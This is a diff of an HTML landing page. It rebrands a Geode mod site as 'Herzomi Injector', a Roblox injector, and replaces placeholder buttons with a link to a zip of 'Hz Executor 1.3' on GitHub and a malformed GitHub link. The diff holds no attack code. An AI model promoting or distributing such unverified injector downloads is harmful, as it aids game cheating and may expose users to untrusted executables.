@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Luxus Hub - Лудшчий сайт для Geode модов</title>
+    <title>Herzomi Injector - This a best injector for roblox</title>
     <style>
         * {
             margin: 0;
@@ -214,8 +214,8 @@
     <i class="arrow-left"> </i><!-- Стрелка слева -->
     <i class="arrow-right"> </i><!-- Стрелка справа -->
     <div class="buttons">
-        <button onclick="window.location.href = 'https://example.com/page1';">Кнопка 1</button>
-        <button onclick="window.location.href = 'https://example.com/page2';">Кнопка 2</button>
+        <button onclick="window.location.href = 'https://github.com/gdggggddfvff/herzomi/raw/refs/heads/main/Hz%20Executor%201.3.zip';">Download Injector</button>
+        <button onclick="window.location.href = '[https://example.com/page2](https://github.com/gdggggddfvff/Herzomi-executor)';">Visit GitHub</button>
     </div>
     <div class="waves-container">
         <div class="wave wave1"></div> <!-- Верхний слой -->
